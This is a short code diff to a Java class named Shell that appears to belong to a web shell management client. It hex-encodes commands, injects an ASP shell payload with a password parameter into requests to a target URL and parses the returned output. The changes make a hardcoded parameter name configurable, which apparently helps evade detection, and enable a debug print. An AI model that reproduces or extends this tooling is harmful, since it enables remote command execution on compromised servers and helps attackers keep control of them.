@@ -94,7 +94,7 @@ public class Shell {
 		String tmp = "";
 		z1 = toHexString(z1);
 		z2 = toHexString(z2);
-		tmp = z1 + "&z2=" + z2;
+		tmp = z1 + "&"+Safe.PARAM2+"=" + z2;
 		String payload = Safe.ASP_SHELL.replace("PARAM1", Safe.PARAM1).replace("PARAM2", Safe.PARAM2);
 		String make = Safe.ASP_MAKE.replace("PAYLOAD", toHexString(payload));
 		String params = Safe.PASS + "=" + make + "&" + Safe.PARAM1 + "=" + tmp;
@@ -195,7 +195,7 @@ public class Shell {
 		String[] index_datas = Common.send(url, params, code).split("\t");
 		String result = null;
 		result = Arrays.toString(index_datas);
-		//System.out.println(result);
+		System.out.println(result);
 		re[0] = result.substring(result.indexOf("[") + 1, result.indexOf("[S]"));
 		re[1] = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf("[S]") + 3,
 				Arrays.toString(index_datas).indexOf("[E]"));
@@ -210,7 +210,6 @@ public class Shell {
 		String tmp = null;
 		String params = null;
 		switch (os) {
-
 		case 1:
 			z1 = "/ccmd";
 			z1 = CheckCMDPath(z1);
